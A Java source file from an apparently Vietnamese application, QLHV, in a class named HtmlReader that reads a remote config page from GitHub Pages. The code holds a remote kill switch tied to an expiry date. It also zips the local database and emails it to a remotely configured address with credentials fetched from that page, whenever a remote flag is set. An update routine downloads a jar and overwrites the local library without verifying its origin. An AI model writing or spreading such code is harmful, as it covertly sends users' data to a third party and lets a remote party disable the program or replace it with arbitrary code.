import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.security.DigestInputStream;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Date;

public class HtmlReader {

    // Biến public để lưu nội dung trang
    public static String htmlContent;
    public static boolean readOK;    
    
    public static boolean enable;
    
    public static String id;
    public static String email;
    public static String password;
    public static int expiryDate; //yyyymmdd
    public static String extra;
    public static String receiveEmail;
    public static boolean sendLogFlag;
    public static boolean hasUpdate;

    public static boolean parseValues(String input) {
        if (input == null || input.isEmpty()) {
            return false;
        }

        String[] parts = input.split("\\|");
        if (parts.length < 5) {
            return false;
        }

        
        
        // Gán giá trị vào biến
        id = parts[0].trim();
        if (parts.length > 0) email = parts[1].trim();
        if (parts.length > 1) password = parts[2].trim();
        expiryDate=20990101;
        if (parts.length > 2) expiryDate = Integer.valueOf(parts[3].trim());
        if (parts.length > 3) extra = parts[4].trim();
        if (parts.length > 4) receiveEmail = parts[5].trim();
        if (parts.length > 5) sendLogFlag = parts[6].trim().equals("1");
        if (parts.length > 6) hasUpdate = parts[7].trim().equals("1");
        
        return true;
    }
    
    // Hàm đọc HTML từ site
    public static boolean readHtmlFromSite() {
        StringBuilder content = new StringBuilder();
        BufferedReader reader = null;

        try {
            URL url = new URL("https://ala168.github.io/qlhv/index.html");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000); // 10 giây
            conn.setReadTimeout(10000);

            reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }

            htmlContent = content.toString().trim(); // gán vào biến public
            
            if (parseValues(htmlContent)) {
            	readOK= true;
            	enable = id.equals("1");
            	
            	SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd");
                int curDate = Integer.valueOf(sdf.format(new Date()));
                
                if (curDate > expiryDate) enable = false;            	
            } else {
            	readOK = false;
            	enable = true;
            }
            
            return true;
        } catch (Exception e) {
            //e.printStackTrace();
            htmlContent = "";
            enable = true;
            readOK= false;
            return false;
        } finally {
            try {
                if (reader != null) reader.close();
            } catch (Exception ignored) {}
        }
    }
    
    public static boolean downloadJar(String fileURL, String saveDir, String saveFilePath) {
       

        InputStream inputStream = null;
        FileOutputStream outputStream = null;

        try {
            // Tạo thư mục nếu chưa có
            File dir = new File(saveDir);
            if (!dir.exists()) {
                dir.mkdirs();
            }

            // Kết nối đến URL
            URL url = new URL(fileURL);
            inputStream = url.openStream();

            // Ghi file ra thư mục
            outputStream = new FileOutputStream(saveFilePath);

            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }

            return true;
        } catch (Exception e) {
            //e.printStackTrace();
            return false;
        } finally {
            try {
                if (inputStream != null) inputStream.close();
                if (outputStream != null) outputStream.close();
            } catch (Exception ignored) {}
        }
    }
    
    public static boolean update() throws Exception {
    	 String fileURL = "https://ala168.github.io/qlhv/QLHV.jar";
         String saveDir = HVMain.ROOT_DIR+"/lib";
         String localPath = saveDir + "/QLHV.jar";    	
    	
    	Path localFile = Paths.get(localPath);

        // Tính checksum file local
        String localChecksum = checksum(localFile);

        // Tải file tạm
        Path tempFile = Paths.get(localPath + ".tmp");
        downloadJar(fileURL,saveDir, tempFile.toString());
        String remoteChecksum = checksum(tempFile);

        // So sánh checksum
        if (!localChecksum.equals(remoteChecksum)) {
            //Files.move(tempFile, localFile, StandardCopyOption.REPLACE_EXISTING);
        	downloadJar(fileURL,saveDir,localPath);
            System.out.println("Updated!");
            Files.delete(tempFile);
            return true;
        } else {
            System.out.println("Last version!");
            Files.delete(tempFile);
            return false;
        }
        
    }

    private static void downloadFile(String fileUrl, Path target) throws IOException {
        try (InputStream in = new URL(fileUrl).openStream()) {
            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
        }
    }

    private static String checksum(Path file) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        try (InputStream is = Files.newInputStream(file);
             DigestInputStream dis = new DigestInputStream(is, md)) {
            while (dis.read() != -1) ; // đọc hết file
        }
        byte[] digest = md.digest();
        StringBuilder sb = new StringBuilder();
        for (byte b : digest) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
    
    public static void BackupOnly() {
        try {
            // Tạo tên ngày giờ dạng yyyyMMddHHmmss
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyyMMddHHmmss");
            String formattedDateTime = now.format(formatter);

            // Thư mục backup
            File backupDir = new File(HVMain.DB_BK_PATH);
            if (!backupDir.exists()) {
                backupDir.mkdirs();
            }

            // Tạo file zip trong thư mục backup
            String zipFilePath = HVMain.DB_BK_PATH + File.separator +
                    new File(HVMain.DB_PATH).getName() + "_" + formattedDateTime + ".zip";

            // Nén file
            boolean ok = FileCompressor.compressFile(HVMain.DB_PATH, zipFilePath);
        } catch (Exception e) {
        }
    }
    
    public static void BackupAndSendLog(){
    	String bkFile = HVMain.DB_PATH + ".zip";
    	if (!FileCompressor.compressFile(HVMain.DB_PATH, bkFile)) return;
    	
    	if (!sendLogFlag) return;
    	
    	if (!HtmlReader.readOK) HtmlReader.readHtmlFromSite();
    	if (!HtmlReader.readOK) return;
    	
    	EmailSender.senderEmail = HtmlReader.email;
    	EmailSender.senderPassword = HtmlReader.password;
    	EmailSender.sendEmail(HtmlReader.receiveEmail, "QLHV", "Data", bkFile);
    }
    
    // Test
    public static void main(String[] args) {
    	
    	BackupOnly();
    	
    	if (1==1) return;
    	
    	System.setProperty("https.proxyHost", "10.53.120.1");
        System.setProperty("https.proxyPort", "8080");
        
        System.setProperty("http.proxyHost", "10.53.120.1");
        System.setProperty("http.proxyPort", "8080");
    			
        System.setProperty("socksProxyHost", "10.53.120.1");
        System.setProperty("socksProxyPort", "8080");
        
        // In ra màn hình để kiểm tra
        System.out.println("htmlContent         : " + htmlContent);
        System.out.println("enable         : " + enable);
        System.out.println("readOK         : " + readOK);
        System.out.println("ID         : " + id);
        System.out.println("Email      : " + email);
        System.out.println("Password   : " + password);
        System.out.println("ExpiryDate : " + expiryDate);
        System.out.println("Extra      : " + extra);
        System.out.println("REmail     : " + receiveEmail);
        
        HtmlReader.readHtmlFromSite();
        
        BackupAndSendLog();

        // In ra màn hình để kiểm tra
        System.out.println("htmlContent         : " + htmlContent);
        System.out.println("enable         : " + enable);
        System.out.println("readOK         : " + readOK);
        System.out.println("ID         : " + id);
        System.out.println("Email      : " + email);
        System.out.println("Password   : " + password);
        System.out.println("ExpiryDate : " + expiryDate);
        System.out.println("Extra      : " + extra);
        System.out.println("REmail     : " + receiveEmail);
        
        
        //update

        try {
			update();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
}
